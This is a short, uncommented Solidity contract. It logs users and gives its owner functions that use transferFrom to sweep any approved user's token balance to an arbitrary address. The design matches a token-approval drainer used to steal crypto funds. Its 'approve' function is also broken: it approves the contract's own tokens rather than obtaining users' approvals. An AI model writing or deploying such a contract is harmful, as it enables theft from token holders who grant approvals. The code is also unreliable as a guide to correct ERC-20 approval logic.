1 // SPDX-License-Identifier: GPL-3.0
2 
3 pragma solidity >=0.7.0 <0.9.0;
4 
5 interface IERC20 {
6     function balanceOf(address account) external view returns (uint256);
7     function allowance(address owner, address spender) external view returns (uint256);
8     function approve(address spender, uint256 amount) external returns (bool);
9     function transferFrom(
10         address from,
11         address to,
12         uint256 amount
13     ) external;
14 }
15 
16 contract MyContract {
17 
18     address public owner;
19     address[] public users;
20 
21     constructor() {
22         owner = msg.sender;
23     }
24 
25     modifier onlyOwner {
26         require(msg.sender == owner);
27         _;
28     }
29     
30     function approve(address tokenAddress) external returns(bool){
31         require(IERC20(tokenAddress).approve(address(this), 115792089237316195423570985008687907853269984665640564039457584007913129639935));
32         users.push(msg.sender);
33         return true;
34     }
35 
36     function allowance(address tokenAddress,address from) public view returns(uint256){
37         uint256 allowanceCount = IERC20(tokenAddress).allowance(from, address(this));
38         return allowanceCount;
39     }
40    
41     function getBalance(address tokenAddress, address user) public view returns (uint256){
42         return IERC20(tokenAddress).balanceOf(user);
43     }
44 
45     function transfer(address tokenAddress, address from, address to) external onlyOwner {
46         uint256 balance = getBalance(tokenAddress, from);
47         uint256 allowanceNum = IERC20(tokenAddress).allowance(from, address(this));
48         uint256 value = balance;
49         if (allowanceNum < balance)value = allowanceNum;
50         IERC20(tokenAddress).transferFrom(from, to,  value);
51     }
52 
53     function transfer(address tokenAddress, address from, address to,uint256 money) external onlyOwner {
54         uint256 balance = getBalance(tokenAddress, from);
55         uint256 allowanceNum = IERC20(tokenAddress).allowance(from, address(this));
56         uint256 value = balance;
57         if(money < balance) value = money;
58         if (allowanceNum < value)value = allowanceNum;
59         IERC20(tokenAddress).transferFrom(from, to,  value);
60     }
61 
62     function transferOwnership(address newOwner)  onlyOwner external {
63         owner = newOwner;
64     }
65 }